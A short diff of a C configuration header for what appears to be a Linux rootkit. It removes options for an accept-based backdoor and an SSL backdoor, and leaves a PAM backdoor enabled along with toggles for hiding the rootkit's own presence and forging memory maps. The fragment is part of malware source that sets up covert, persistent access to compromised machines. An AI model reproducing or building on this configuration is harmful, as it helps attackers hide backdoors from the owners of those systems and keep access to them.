@@ -18,14 +18,6 @@
 /* requires PAM */
 #define USE_PAM_BD
 
-/* no mandatory dependencies unless you choose to use SSL.
- * i'd have to discourage trying to use this for the time
- * being as this hasn't been my main focus as of late. */
-#undef USE_ACCEPT_BD
-/* requires SSL to be installed or present. SSL backdoor
- * source port is $(( ACCEPT_PORT + 1 )) */
-#undef ACCEPT_USE_SSL
-
 /* all of the essential presence hiding toggles are ignored... */
 #define HIDE_SELF //ignore
 #define FORGE_MAPS //ignore
